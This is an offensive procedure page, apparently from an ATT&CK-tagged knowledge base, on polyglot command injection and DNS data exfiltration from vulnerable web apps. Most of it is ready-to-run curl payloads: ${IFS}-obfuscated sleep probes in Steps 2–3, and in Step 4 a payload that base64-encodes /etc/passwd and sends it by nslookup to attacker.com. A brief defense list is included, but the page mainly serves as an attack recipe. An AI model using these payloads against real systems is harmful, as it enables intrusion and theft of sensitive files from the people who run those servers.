---
type: procedure
description: >-
  Inject polyglot command payloads into vulnerable applications to execute
  commands and exfiltrate data via DNS queries, evading detection through
  multi-parser comment evasion.
verified: true
submitted: false
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Application Layer Protocol|T1071 - Application Layer Protocol]]'
sub_techniques:
  - '[[sub-techniques/Unix Shell|T1059.004 - Unix Shell]]'
tags:
  - '[[tags/Command Injection]]'
  - '[[tags/Polyglot Command Injection]]'
  - '[[tags/DNS Exfiltration]]'
commands:
  - '[[commands/curl-polyglot-injection-test]]'
platforms:
  - Linux
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Polyglot-Command-Injection-for-DNS-Data-Exfiltration

## Summary

This procedure demonstrates how to use polyglot command injection payloads to execute arbitrary commands in vulnerable web applications that invoke system shells, enabling blind command execution confirmation via timing delays and data exfiltration through DNS queries. Polyglot payloads incorporate multiple comment styles (e.g., #, /* */, ||) to bypass varying parser behaviors in different environments, making them effective against filtered inputs. Once injection is confirmed, payloads are adapted to encode and send sensitive data (e.g., file contents) as DNS subdomains to an attacker-controlled DNS server.

## Description

Polyglot command injection targets applications that unsafely pass user input to system commands like ping, whoami, or custom scripts, allowing attackers to append or prepend malicious commands. By using comments from multiple languages (Bash, SQL, JavaScript, etc.), the payload ensures execution regardless of the backend parser, evading WAFs or input sanitization that blocks single-style injections. For DNS exfiltration, the payload constructs a command like `nslookup $(cat /etc/passwd).attacker-dns.com`, where data is base64-encoded in the subdomain for transmission over DNS, which often bypasses firewalls. This is particularly useful in blind scenarios where direct output isn't visible, using sleep delays for confirmation before exfil. Target environments include web apps on Linux servers with shell execution vulnerabilities (e.g., legacy PHP or Node.js apps). Success relies on controlling a DNS server to capture queries, revealing exfiltrated data.

## Requirements

1. Access to a vulnerable web application endpoint that accepts user input passed to a system command (e.g., a ping form or search field).
2. Attacker-controlled DNS server (e.g., Burp Collaborator, a custom domain with wildcard DNS logging) to receive exfiltration queries.
3. Network access to the target application, ideally with a proxy like Burp Suite for payload testing.
4. Basic knowledge of the target's shell environment (assumed Unix/Bash for this procedure).
5. Tools for encoding data (e.g., base64) to fit DNS label limits (63 characters max per subdomain).

## Defense

- Implement strict input validation and sanitization, whitelisting allowed characters and escaping shell metacharacters.
- Use parameterized queries or APIs that avoid direct shell invocation (e.g., replace system() with safer libraries).
- Monitor DNS traffic for anomalous queries from internal systems, especially large or encoded subdomains.
- Deploy WAF rules to detect polyglot patterns like mixed comments (#, /*, ||) in inputs.
- Enable application logging for command executions and integrate with SIEM for anomaly detection.

## Objectives

1. Confirm blind command injection vulnerability using timing-based sleep payloads.
2. Inject and execute polyglot payloads to evade detection.
3. Exfiltrate sensitive data (e.g., file contents, environment variables) via DNS queries to attacker server.
4. Verify receipt of exfiltrated data on the attacker's DNS logs.

## Instructions

### Step 1: Set Up Attacker DNS Server for Exfiltration Capture

**Context**: Establish a DNS server to log incoming queries containing exfiltrated data. This step ensures you can capture subdomains sent from the target.

Use a service like Burp Collaborator or set up a simple DNS logger. For example, configure a domain like attacker.com with wildcard DNS pointing to a logging server.

**Expected Output**: DNS server ready, with logs showing query timestamps, client IPs, and subdomain data.

### Step 2: Test Blind Injection with Bash Polyglot Sleep Payload

**Context**: Inject a polyglot sleep payload to confirm command injection without visible output, using timing delays (e.g., page load time increases by 9 seconds). This payload uses Bash-style comments (#, '; #, "; #) to evade parsers.

**Code** ([[codes/Bash-Polyglot-Sleep-Payload-Type1]]):

Use [[commands/curl-polyglot-injection-test]] to submit the payload to the vulnerable endpoint (e.g., /ping?host=).

```bash
curl "http://target.com/ping?host=1;${IFS}sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\"sleep${IFS}9;#${IFS}" -w "%{time_total}s"
```

> This sends the polyglot sleep command after a benign input (e.g., '1'). Measure response time; a delay of ~9 seconds indicates successful injection. The ${IFS} uses internal field separator for spacing without tabs/spaces, enhancing evasion.

**Expected Output**: HTTP response with total time >10 seconds if injected successfully; normal <1 second otherwise.

### Step 3: Test with Universal Polyglot Sleep Payload

**Context**: Use a more versatile polyglot payload supporting multiple languages (SQL comments /* */, backticks `, || for conditionals) for broader compatibility, confirming injection in diverse parsers.

**Code** ([[codes/Universal-Polyglot-Sleep-Payload-Type2]]):

Adapt and inject via [[commands/curl-polyglot-injection-test]]:

```bash
curl "http://target.com/ping?host=YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/" -w "%{time_total}s"
```

> Replace YOURCMD with a benign command like 'ping -c1 127.0.0.1'. The payload appends a 5-second sleep using mixed syntax. Time the response for confirmation.

**Expected Output**: Response time increased by ~5 seconds on success.

### Step 4: Craft and Inject DNS Exfiltration Payload

**Context**: Once injection is confirmed, adapt the polyglot structure to read and exfiltrate data. Encode sensitive data (e.g., base64 of /etc/passwd) and append to a DNS query command like nslookup or dig.

Construct payload: benign; polyglot $(cat /path/to/file | base64).attacker.com ; polyglot

Example using Type1 structure:

```bash
curl "http://target.com/ping?host=1;${IFS}nslookup${IFS}$(cat${IFS}/etc/passwd${IFS}|base64).attacker.com;#${IFS}';nslookup${IFS}$(cat${IFS}/etc/passwd${IFS}|base64).attacker.com;#${IFS}\"nslookup${IFS}$(cat${IFS}/etc/passwd${IFS}|base64).attacker.com;#${IFS}\" -w "%{time_total}s"
```

> This executes nslookup with the file content as subdomain, sending it to your DNS server. For large files, chunk and exfil in parts to avoid DNS limits.

**Expected Output**: No direct output, but DNS logs show query with encoded data in subdomain (e.g., Y2F0IC9ldGMvcGFzc3dk.attacker.com).

### Step 5: Verify Exfiltration on Attacker DNS Server

**Context**: Check logs for incoming DNS queries to decode and reconstruct exfiltrated data.

Query your DNS logs for subdomains under attacker.com from the target's IP.

**Expected Output**: Logged DNS query with base64 subdomain; decode to reveal original data (e.g., base64 -d on the subdomain string).
